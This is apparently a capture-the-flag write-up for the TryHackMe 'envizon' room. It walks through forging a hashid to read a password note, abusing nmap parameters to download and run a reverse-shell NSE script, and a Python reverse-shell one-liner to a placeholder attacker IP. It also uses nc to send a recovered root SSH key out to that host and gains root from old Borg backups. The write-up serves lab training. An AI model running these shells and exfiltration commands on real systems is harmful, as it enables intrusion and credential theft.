<https://tryhackme.com/room/envizon>

You are facing an instance of the open source software "envizon" (<https://github.com/evait-security/envizon>) which is used by pentesters to visualize networks, find promising targets and a lot of other juicy stuff. It was developed by pentesters and should be almost unbreakable, right? The version 4.0.2alpha used here is still in permanent development and has not been tested for vulnerabilities yet. Your task is to find, exploit and chain vulnerabilities in a white-box approach in order to completely compromise the whole system.

You can find the source code for the current version here: <https://gitlab.com/evait-security/envizon_thm>

Three hints to start:

- This is not an empty instance. Imagine that it is/was used and therefore contains user data
- Currently a note function is under development
- When looking for code execution on the system, the most obvious way is the best - it is important to understand what the application does

# Enumeration

## \[+] 10.10.244.38 - envizon.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```
$ echo '10.10.244.38 envizon.thm' >> /etc/hosts
$ export RHOSTS=10.10.244.38
$ rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
$ sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 3000 - HTTPS

Using [feroxbuster](https://github.com/epi052/feroxbuster) to fuzz for directories and files:

```

There are some interesting directories that were found, most notably `/notes/`. But they redirect to the login page. It's possible to still discover files within these directories if we have permissions to read them.

```
$ feroxbuster -u https://envizon.thm:3000/notes/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,301,302,403 -k -o p-3000-www-notes-ferox.txt

### \[-] envizon.thm:3000/notes/1

Here we have a note with a hint on where we can find the password:

*"Text: Hi Paul, for security reasons I added hashids with a length of 30 characters to notes. I stored the password for this envizon instance in the note with id 380 and sent you the link by email. We may should consider to add more security layers to this gem (<https://github.com/dtaniwaki/acts_as_hashids>)"*

![953e313e433353923efc0f06d306c6a7.png](/resources/b326f2b8b2704d898de0f05b05f948d7.png)

If we check the link to edit the note, we can get an idea of what the hashid looks like:

`https://envizon.thm:3000/notes/Q36xB7PpDGnZ0ED4E28qrdRgkzyJbw/edit`

And looking at the Github repository for '[acts\_as\_hashids](https://github.com/dtaniwaki/acts_as_hashids)' we can see some options that can be set for generating the hashids:
![fcced0dc49c3d501055c52f3fa2f8247.png](/resources/3a375fefdf5d48f0aed20f284b1178a6.png)

We already know the length of the hashid should be 30 characters as per the note. From the acts\_as\_hashids README.md, the default secret is the class name. Checking the source code for this instance of [Envizon](https://gitlab.com/evait-security/envizon_thm) under app > models > note.rb we can see the class name is 'Note':
![d5e3f532533953c48b906f08728ca23e.png](/resources/cde6100a428648cbb6408b13d1c4f811.png)

To generate the hashid we can use an [online hashids generator](https://hashids.gosu.bar) and set the salt/secret to `Note`, minimum length to `30` and decoded to `380` and the hashid will be in the encoded field:
![2777b5b06de68d08359d376f0766b650.png](/resources/a97a07093dd84718adbb87f6703da006.png)

Now we can check the note by appending the hashid to the URL `https://envizon.thm:3000/notes/<insert_hashid_here>` and get the password to Envizon:
![cea431825806ec3b55d3045cf5f3230e.png](/resources/bf90f5f8bfa046328e5e7dce5a086752.png)

# Initial Foothold

This application is using Nmap to do it's enumeration, we can use that to download a reverse shell script for the Nmap Script Engine (NSE).

We can get the commands we need from GTFOBin's [Nmap section](https://gtfobins.github.io/gtfobins/nmap/#file-download).

First, we can test to see if Nmap will make a request to our HTTP server.

Host the HTTP server using `python3` on the attacker machine:

```
$ python3 -m http.server 8080
```

On the Envizon website, navigate to Scans > Manual Scans, the URL is `https://envizon.thm:3000/scans` and enter `-p 8080 --script http-fetch --script-args http-fetch.destination=/tmp/test,http-fetch.url=test` into the Nmap Parameter field, IP of the attacker machine in the Target field and anything for the Name field:
![706d93e5402d7a78107b7f21c388ed2a.png](/resources/6548fc5f9c064ea88d6c568b3bc80065.png)

Then click the cup icon and check the terminal where the Python HTTP server is running to see the GET request for 'test' and confirm the file download. The file isn't there so it returns a 404 error:
![a535b273ed91b4b44fb3cdd81bf5d292.png](/resources/60a9b6c74d354214a04d1e7c44175313.png)

To get a reverse shell, we can use this [NSE script](https://github.com/SurajDadral/nmap-reverse-shell/blob/main/reverse_shell.nse) by Suraj Dadral. Save it to the directory that the Python HTTP server is hosting.

Then to download it to the victim machine, change the Nmap parameter from `-p 8080 --script http-fetch --script-args http-fetch.destination=/tmp/test,http-fetch.url=test` to `-p 8080 --script http-fetch --script-args http-fetch.destination=/tmp/reverse_shell,http-fetch.url=reverse_shell.nse`

In the Python HTTP server terminal we should see `"GET /reverse_shell.nse HTTP/1.1" 200`, which means the file transfer has succeeded.

Before we can run the NSE script we have to set up two listeners on the attacker machine. Exit the Python HTTP server so we can use port 8080 again. Then open another terminal for the second listener:

Main terminal for the reverse shell:

```
$ nc -nvlp 8080
```

Secondary terminal on another open port to let the Nmap scan succeed:

```
$ nc -nvlp 1234
```

Back to the Envizon web application, we run another manual scan with the Nmap Parameters `-p 1234 --script /tmp/reverse_shell/<ATTACKER_IP>/8080/reverse_shell.nse`, attacker IP in the Target field and anything for the Name field:
![59c96c49598d6f0bb5cee0f08b824d88.png](/resources/acbde9de610d4eeeb79f8b2cd50195db.png)

And on the attacker machine in the terminal that is listening on port 8080, we get a connection from the victim machine:
![26893f966119e24c12395f1889507076.png](/resources/8821a2ab9c5c4e738b08540fd4609cdc.png)

The current shell we are in is limited and cannot traverse directories. We need to start another `nc` listener on the attacker machine then use a `python3` stable shell one-liner on the victim machine to connect to it:

On the attacker machine open a new terminal and listener:

```
$ nc -nvlp 4444
```

On the victim machine:

```
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

From here we can get the flag in `/root/local.txt`:
![32d38de75efc110b25a8124404209779.png](/resources/c359362603134fbcb9eeb0dc97c04b5b.png)

# Privilege Escalation

Also in the `/root/` directory is a directory named '.config'. Inside this directory are some configuration files for [BorgBackup](https://www.borgbackup.org/). We can find the location of the backup files by reading the location file in `/root/.config/borg/security/ac2cd401e68a156bd667f11920ebebd6de162946b4f2b834bb564cff02abc195/location`:

```
$ cd /root/.config/borg/security/ac2cd401e68a156bd667f11920ebebd6de162946b4f2b834bb564cff02abc195/
$ cat location
/var/backup
```

![1455850985ea057d4de8e7b9b947ce73.png](/resources/87e9095491ee4d8b9d5c52ab650f2889.png)

Using the command `crontab -l` we can check to see if there are any scheculed tasks for backing up files:

```
$ crontab -l
```

![202b112de7bc0db8c7b1f5fe704a2c0f.png](/resources/acce25be77c049509a0033cd304cb7f4.png)

There are scheduled tasks for executing the [run-parts](https://linux.die.net/man/4/crontabs) command which will run all executables in the specified directory.

After using `ls -lah /etc/periodic/*` to look for any executables or scripts. We find a 'borg\_backup.sh' script in the `/etc/periodic/daily/` directory:

```
$ ls -lah /etc/periodic/*
```

![efd0d84895770b394d3fed54b418a115.png](/resources/392b27af583248749259a76272d80bff.png)

Reading the script with `cat` shows it's not actually doing anything since it's all commented out, but we get a hint on where to look next:

```
$ cat /etc/periodic/daily/borg_backup.sh
```

![b477f51ca4804ff55739fc109af52472.png](/resources/d4f875a68a724db8a0a450b1e23c9768.png)

Searching for 'borgmatic' with the `find` command we get a couple of results for further enumeration:

```
$ find / -name '*borgmatic*' 2>/dev/null
```

![3c97ae0e1596f149b33dee141469da84.png](/resources/1a5ca8a62a34419da095b5703bbef282.png)

Checking the first result, `/etc/borgmatic/` we find a 'config.yaml' file and in this file there is a encryption key that we can use to restore the backups created with BorgBackup:

```
$ cd /etc/borgmatic/
$ ls -lah
$ cat config.yaml
```

![863c6e5c6d6ab5b9e78b2e97416cc3d6.png](/resources/b4da46ecc49a44d684112431da065e9d.png)

To restore the backups, first we have to list the available backups and then use the `/tmp/` directory to store them in:

```
$ cd /tmp
$ borg list /var/backup
```

![68dbf3de10cc90c4ba091d66bbff7725.png](/resources/980a47b49c1a4999bdffcde6a657fab8.png)

Next, we'll extract the first back up `envizon-2020-09-30T23:25:30.466049` using `borg extract`:

```
$ borg extract /var/backup::envizon-2020-09-30T23:25:30.466049
```

Inside the `/tmp/root/.ssh/` directory is an SSH key that was not present in current `/root/.ssh/` directory:

```
$ cd /tmp/root/.ssh/
$ cat id_ed25519
```

![461d992c387f36400e8e8e6fe61b66e8.png](/resources/22091537bcd84823a6fda9b0226be111.png)

We can save this to the attacker machine and connect via SSH on port 22. I will use `nc` to transfer the file or you can copy and paste it:

On the attacker machine:

```
$ nc -lp 1234 > id_rsa
```

On the victim machine:

```
$ nc -w 3 <ATTACKER_IP> 1234 < id_ed25519
```

And then use `chmod` to give the SSH key the proper permissions before trying to connect:

```
$ chmod 600 id_rsa
```

## Port 22 - SSH

Using the SSH key we just found we can connect via SSH:

```
$ ssh -i id_rsa root@$RHOSTS
```

After connecting we can find the root flag in `/root/root.txt`:

```
$ cat /root/root.txt
```
